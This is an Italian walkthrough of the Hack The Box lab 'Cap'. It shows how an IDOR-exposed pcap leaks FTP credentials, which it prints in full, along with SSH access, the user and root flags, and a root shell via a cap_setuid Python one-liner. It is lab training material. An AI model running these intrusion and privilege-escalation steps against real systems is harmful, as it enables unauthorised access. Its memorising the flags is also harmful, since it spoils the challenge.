# CAP – HTB

## 🧠 Descrizione generale

Questa macchina mette alla prova l'analisi di file `.pcap`, l'esplorazione web e l'escalation di privilegi tramite capabilities Linux. Si lavora inizialmente con Nmap e Wireshark, per poi arrivare a un'escalation a root sfruttando un binario Python con capability pericolosa.

---

## 🔍 Scansione iniziale con Nmap

```bash
sudo nmap -sV -sC -T4 10.129.150.73

✅ Risposta alla task:

How many TCP ports are open? → 3
## 🌐 Esplorazione del sito web

    Porta 80 aperta → visito http://10.129.150.73

    Trovo endpoint /data/1 che permette il download di un file .pcap

    Scopro che i file cambiano ID progressivamente (/data/2, /data/3, ecc.)

    Testo l’ID 0 e scarico 0.pcap → è valido!

✅ Task risolte:

    What is the [something]? → data

    Does the first pcap file show anything interesting? → Yes

    What is the scan ID of the first pcap file? → 0

## 📦 Analisi del file 0.pcap con Wireshark
Filtri e tecniche:

    Seguo i flussi FTP in Wireshark

    Trovo credenziali in chiaro:

USER nathan
PASS Buck3tH4TF0RM3!

✅ Risposte:

    Which application layer protocol in the pcap file can the sensitive data be found in? → ftp

## 🔐 Accesso SSH con credenziali trovate

ssh nathan@10.129.150.73
# Password: Buck3tH4TF0RM3!

✔️ Accesso riuscito

ls
# user.txt → 0756f317b6f3819e071af9f7cc8a1797

🚩 User Flag

0756f317b6f3819e071af9f7cc8a1797

## 🔎 Analisi delle Linux Capabilities

getcap -r / 2>/dev/null

Output rilevante:

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

✅ Individuato /usr/bin/python3.8 come binario sfruttabile.
Perché è pericoloso?

    La capability cap_setuid+eip permette al binario di cambiare il proprio UID.

    Usando Python è possibile eseguire codice per diventare root tramite os.setuid(0).

## 🧨 Privilege Escalation

Comando eseguito:

/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

✔️ Shell diventata root (whoami → root)

🚩 Root Flag

a9e9d4191a5978ddc6a9c98c87b4674e

## 📌 Lezioni apprese

    Le Linux capabilities come cap_setuid possono rappresentare una vulnerabilità critica se applicate a binari interattivi.

    L’analisi dei file .pcap può rivelare credenziali in chiaro se si usano protocolli non cifrati come FTP.

    L’esplorazione sistematica degli endpoint HTTP può portare alla scoperta di file importanti.